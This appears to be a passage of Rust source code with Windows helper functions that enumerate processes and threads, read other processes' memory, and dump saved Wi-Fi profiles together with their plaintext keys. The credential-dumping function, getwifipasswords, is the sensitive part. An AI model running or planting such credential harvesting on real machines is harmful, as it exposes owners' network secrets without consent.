            let mut env:Vec<u16> = vec![0;envlength];
            let mut bytesread=0;
            ReadProcessMemory(prochandle, 
                rtlparams.Environment, 
                env.as_mut_ptr() as *mut c_void, 
                envlength, &mut bytesread);

            let mut temp = ReadStringFromMemory(prochandle, env.as_ptr() as *const c_void);
            println!("{}",temp);
            
            loop{

                if temp==""{
                    break;
                }

                temp = ReadStringFromMemory(prochandle, (env.as_ptr() as usize + temp.len()) as *const c_void);
                println!("{}",temp);


            }*/

            //println!("{:x?}",&env);

            return Err("something went wrong".to_string());

        }
    }


    /// This function tries to enumerate all running processes.
    /// If OpenProcess failed to open a process, this function ignores that process.
    pub fn getprocesses() -> Result<HashMap<String,u32>,String>{

        unsafe{
            let mut h1:HashMap<String,u32> = HashMap::new();


            let snaphandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

            let mut procentry = std::mem::zeroed::<PROCESSENTRY32W>();
            procentry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            let mut res = Process32FirstW(snaphandle, &mut procentry);
            let mut procname = String::from_utf16_lossy(&procentry.szExeFile);
            h1.insert(procname.trim_end_matches("\0").to_string(), procentry.th32ProcessID);

            loop{

                if res==0{
                    break;
                }

                res = Process32NextW(snaphandle, &mut procentry);
                procname = String::from_utf16_lossy(&procentry.szExeFile);
                h1.insert(procname.trim_end_matches("\0").to_string(), procentry.th32ProcessID);
            }

            

            /*let mut pids:Vec<u32> = vec![0;102400];
            let mut bytesneeded = 0;
            
            
            let res = EnumProcesses(pids.as_mut_ptr() as *mut u32,
             pids.len() as u32, &mut bytesneeded);

             if res==0{
                //println!("EnumProcesses failed: {}",GetLastError());
                return Err(format!("enumprocesses failed: {}",GetLastError()));
             }

             //println!("{:?}",&pids[0..23]);
             //println!("number of processes: {}",bytesneeded/4);

             for i in 0..(bytesneeded/4){
                let prochandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, 0, pids[i as usize]);

                if prochandle.is_null(){
                    //println!("Openprocess failed: {}",GetLastError());
                    continue;
                }

                let mut procname: Vec<u16> = vec![0;102400];
                let res = GetModuleBaseNameW(prochandle, std::ptr::null_mut(), 
                    procname.as_mut_ptr() as *mut u16, procname.len() as u32);

                if res==0{
                    continue;
                }

                let processname = String::from_utf16_lossy(&procname).to_string();
                h1.insert(processname.trim_end_matches("\0").to_string(), pids[i as usize]);
                
                //println!("{}",String::from_utf16_lossy(&procname));


             }*/

             return Ok(h1);
            
        }

    }


    pub fn getprocessthreads(procid: u32) -> Vec<u32>{

        unsafe{

            let mut threadids:Vec<u32> = Vec::new();
            let snaphandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

            let mut threadentry = std::mem::zeroed::<THREADENTRY32>();
            threadentry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

            let mut res = Thread32First(snaphandle, &mut threadentry);

            if threadentry.th32OwnerProcessID == procid{
                threadids.push(threadentry.th32ThreadID);
            }

            loop{

                if res==0{
                    break;
                }

                res = Thread32Next(snaphandle, &mut threadentry);

                if threadentry.th32OwnerProcessID == procid{
                    threadids.push(threadentry.th32ThreadID);
                }


            }
            return threadids;

        }

    }



    pub fn getwifipasswords() {
        unsafe{

            let mut negotiationversion = 0;
            let mut clienthandle = 0 as *mut c_void;
            
            let res = WlanOpenHandle(2, 
                std::ptr::null_mut(), 
               &mut negotiationversion, 
                &mut clienthandle);

            if res!=ERROR_SUCCESS{
                println!("Wlanopenhandle failed: {}",res);
                std::process::exit(0);
            }

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut outpointer = 0 as *mut WLAN_INTERFACE_INFO_LIST;
            let res = WlanEnumInterfaces(clienthandle, 
                std::ptr::null_mut(), 
                &mut outpointer  );
                
            if res!=ERROR_SUCCESS{
                println!("wlanenuminterfaces failed: {}",res);
                std::process::exit(0);
            }

            //println!("outpointer: {:x?}",outpointer);

            // reading number of items value, first 4 bytes
            let mut numberofitems = 0;
            let mut bytesread = 0;
            ReadProcessMemory(GetCurrentProcess(), 
                outpointer as *const c_void, 
                &mut numberofitems as *mut _ as *mut c_void, 
                4, &mut bytesread);    

            //println!("number of items/interfaces: {}",numberofitems);
            
            //let mut interfaces: Vec<u8> = vec![0;(std::mem::size_of::<WLAN_INTERFACE_INFO>())*numberofitems];
            let mut interfaces: Vec<u8> = vec![0;(std::mem::size_of::<WLAN_INTERFACE_INFO>())];

            for i in 0..numberofitems{

                ReadProcessMemory(GetCurrentProcess(),  
                (outpointer as usize + 8 + (i*std::mem::size_of::<WLAN_INTERFACE_INFO>())) as *const c_void,
                 interfaces.as_mut_ptr() as *mut c_void, 
                 std::mem::size_of::<WLAN_INTERFACE_INFO>(), 
                    &mut bytesread);

                let interface = *(interfaces.as_mut_ptr() as *mut WLAN_INTERFACE_INFO);

                
                let wifidescription = String::from_utf16_lossy(&interface.strInterfaceDescription).trim_end_matches("\0").to_string();
                println!("Wifi Description: {}",wifidescription);
                
                println!("GUID: {:x?}-{:x?}-{:x?}-{:x?}",interface.InterfaceGuid.Data1,
                interface.InterfaceGuid.Data2,interface.InterfaceGuid.Data3,interface.InterfaceGuid.Data4);

                println!("State: {}",interface.isState);


                // getting all wifi networks available
                let mut netpointer = 0 as *mut WLAN_AVAILABLE_NETWORK_LIST;

                let res = WlanGetAvailableNetworkList(clienthandle, 
                    &interface.InterfaceGuid , 
                    1, 
                    std::ptr::null_mut(), 
                &mut netpointer);
                if res!=ERROR_SUCCESS{
                    println!("wlangetavailablenetworklist failed: {}",res);
                    continue;
                }


                let mut numberofnetworks = 0;

                ReadProcessMemory(GetCurrentProcess(), 
                netpointer as *const c_void, 
                &mut numberofnetworks as *mut _ as  *mut c_void, 
                4, &mut bytesread);

                //println!("number of networks: {}",numberofnetworks);
                let mut network :Vec<u8> = vec![0;std::mem::size_of::<WLAN_AVAILABLE_NETWORK>()];

                for j in 0..numberofnetworks{

                  
                    ReadProcessMemory(GetCurrentProcess(),  
                (netpointer as usize + 8 + (j*std::mem::size_of::<WLAN_AVAILABLE_NETWORK>())) as *const c_void,
                 network.as_mut_ptr() as *mut c_void, 
                 std::mem::size_of::<WLAN_AVAILABLE_NETWORK>(), 
                    &mut bytesread);

                    let wifinetwork = *(network.as_mut_ptr() as *mut WLAN_AVAILABLE_NETWORK);

                    let wifiname = String::from_utf8_lossy(&wifinetwork.dot11Ssid.ucSSID).trim_end_matches("\0").to_string();
                    

                    let mut outxml: Vec<u16> = vec![0;10240];
                    let mut xmlpointer = 0 as *mut u16;

                   if wifinetwork.strProfileName!=[0;256]{
                    let mut profileflags :Vec<u8> = vec![0;1024];
                    profileflags[0] = 4;
                    //let mut profilename = wifinetwork.strProfileName.as_mut_ptr() as *mut u16;
                    let res = WlanGetProfile(clienthandle, 
                        &interface.InterfaceGuid  , 
                        wifinetwork.strProfileName.as_ptr() as *const u16 , 
                        std::ptr::null_mut(), 
                        &mut xmlpointer, 
                        profileflags.as_mut_ptr() as *mut u32, 
                    std::ptr::null_mut());

                    if res!=ERROR_SUCCESS{
                        //println!("wlangetprofile failed: {}",res);
                        continue;
                    }

                     //println!("profileflags: {:x?}",xmlpointer); 

                    let mut password:Vec<u16> = vec![0;10240];
                    
                     ReadProcessMemory(GetCurrentProcess(), 
                     xmlpointer as *const c_void, 
                     password.as_mut_ptr() as *mut c_void, 
                     2048, &mut bytesread);

                     println!("Network name: {}",wifiname);
                    let xmldata = String::from_utf16_lossy(&password).trim_end_matches("\0").to_string();
                    println!("{}",xmldata);

                    }
                }

                //WlanFreeMemory(network.as_mut_ptr() as *mut c_void);


            }
            
            WlanCloseHandle(clienthandle, std::ptr::null_mut());

        }

}    



    pub fn ReadStringFromMemory(prochandle: *mut c_void, base: *const c_void) -> String {
        unsafe {
            let mut i: isize = 0;
            let mut s = String::new();
            loop {
                let mut a: [u8; 1] = [0];
                ReadProcessMemory(
                    prochandle,
                    (base as isize + i) as *const c_void,
                    a.as_mut_ptr() as *mut c_void,
                    1,
                    std::ptr::null_mut(),
                );
    
                if a[0] == 0 || i == 500 {
                    return s;
                }
                s.push(a[0] as char);
                i += 1;
            }
        }
    }
    
















    pub fn FillStructureFromMemory<T>(dest: &mut T,src: *const c_void,prochandle: *mut c_void,) -> usize {
    unsafe {
        let bytestoread: usize = std::mem::size_of::<T>();
        ////println!("size of structure is {}",bytestoread);
        let mut buffer: Vec<u8> = vec![0; bytestoread];
        let mut byteswritten = 0;

        let res = ReadProcessMemory(
            prochandle,
            src,
            buffer.as_mut_ptr() as *mut c_void,
            bytestoread,
            &mut byteswritten,
        );
        ////println!("array being filled: {:x?}",&buffer);
        FillStructureFromArray(dest, &buffer);

        return byteswritten;
    }
}

    pub fn FillStructureFromArray<T, U>(base: &mut T, arr: &[U]) -> usize {


    
    unsafe {
        //println!("{}",std::mem::size_of::<T>());
        //println!("{}",std::mem::size_of_val(arr));
        /*if std::mem::size_of::<T>() != std::mem::size_of_val(arr) {
            println!("{}", std::mem::size_of::<T>());
            println!("{}", std::mem::size_of_val(arr));
            panic!("sizes are not equal to copy");
        }*/

        let mut handle = GetCurrentProcess();
        let mut byteswritten = 0;
        let res = WriteProcessMemory(
            handle,
            base as *mut _ as *mut c_void,
            arr as *const _ as *const c_void,
            std::mem::size_of::<T>(),
            &mut byteswritten,
        );

        return byteswritten;
    }
}


}
